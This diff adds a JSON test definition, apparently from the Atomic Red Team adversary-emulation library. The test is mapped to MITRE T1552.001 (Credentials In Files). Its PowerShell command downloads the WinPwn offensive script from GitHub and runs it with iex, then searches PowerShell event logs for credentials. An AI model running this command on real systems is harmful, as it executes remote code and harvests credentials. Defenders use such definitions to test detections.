@@ -1,0 +1,23 @@
+{
+    "name": "WinPwn - powershellsensitive",
+    "description": "Check Powershell event logs for credentials or other sensitive information via winpwn powershellsensitive function.",
+    "supported_platforms": [
+        "windows"
+    ],
+    "executor": {
+        "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\npowershellsensitive -consoleoutput -noninteractive",
+        "name": "powershell",
+        "type": "Command Executor"
+    },
+    "id": "T1552.001",
+    "tactics": [
+        "Credential Access"
+    ],
+    "technique": "Credentials In Files",
+    "source": "ART",
+    "uuid": "75f66e03-37d3-4704-9520-3210efbe33ce",
+    "arguments": null,
+    "preconditions": [],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
